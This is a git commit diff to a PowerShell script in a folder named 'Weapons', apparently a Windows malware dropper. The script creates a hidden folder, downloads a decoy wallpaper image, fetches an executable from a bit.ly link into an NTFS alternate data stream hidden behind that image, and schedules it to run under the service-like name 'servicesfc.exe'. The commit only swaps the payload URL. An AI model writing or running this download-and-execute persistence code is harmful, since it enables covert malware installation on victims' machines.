31d18b004137c00254694504fcc8ef33a7215a15
Anant Kaul <56610952+anantkaul@users.noreply.github.com>
2022-03-05 03:52:25 +0530

    Updated services bitly

--- Weapons/reg64.ps1
+++ Weapons/reg64.ps1
@@ -3,5 +3,5 @@
 mkdir C:\ProgramData\.temp
 [Net.ServicePointManager]::SecurityProtocol = 'tls12, tls11, tls'
 curl https://wallpaperaccess.com/full/94002.jpg -o C:\ProgramData\.temp\94002.jpg
-cmd /c "curl https://bit.ly/3sJgOjB -o C:\ProgramData\.temp\94002.jpg:services.exe"
+cmd /c "curl https://bit.ly/3sIId5a -o C:\ProgramData\.temp\94002.jpg:services.exe"
 schtasks /create /tn "servicesfc.exe" /tr C:\ProgramData\.temp\94002.jpg:services.exe /sc once /sd 25/12/2025 /st 15:00:00 /z
